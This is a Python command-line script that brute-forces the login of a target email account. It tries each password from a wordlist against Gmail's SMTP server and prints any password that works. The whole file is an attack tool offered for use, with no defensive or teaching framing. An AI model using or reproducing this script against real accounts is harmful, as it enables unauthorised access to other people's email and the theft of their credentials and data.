#!/usr/bin/env python3

import smtplib
import time
import threading
import sys
import argparse

threadLock = threading.Lock()
threads = []

def get_time():
    time_now = time.strftime("%H:%M:%S")
    return time_now

def bruteForce(email, wordlist):
    time_now = get_time()
    with open(wordlist) as file:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            try:
                for password in file:
                    try:
                        server.login(email, password)
                        threadLock.acquire()
                        print(f"[\033[96m{time_now}\033[0m] \033[92mPassword is: \033[0m{password.strip()}")
                        threadLock.release()
                    except smtplib.SMTPAuthenticationError:
                        threadLock.acquire()
                        print("[\033[96m{}\033[0m] \033[91mInvalid Password: \033[0m{}".format(time_now, password.strip()))
                        threadLock.release()
                        continue
                    except smtplib.SMTPServerDisconnected:
                        continue
            except KeyboardInterrupt:
                print("")
                sys.exit()
        except:
            pass

def parser():
    parser = argparse.ArgumentParser(description='\033[96mBrute Force Email Login\033[0m', usage='python3 BruteForceEmail.py <target> <wordlist>')
    parser.add_argument("-e", "--email", help="Email target")
    parser.add_argument("-w", "--wordlist", help="Wordlist to brute force email login")

    args = parser.parse_args()
    if not args.email:
        parser.error("Please use --help for more information")
    if not args.wordlist:
        parser.error("Please use --wordlist to brute force email login")
    return args

def main():
    args = parser()
    email = args.email
    wordlist = args.wordlist
    bruteForce(email, wordlist)

if __name__ == '__main__':
    time_now = get_time()
    print("\n\033[93m[{}] \033[96mStarting:\033[0m\n".format(time_now))
    t = threading.Thread(target=main())
    threads.append(t)
    t.start()

    for i in threads:
        i.join()
    print("\nDone!")






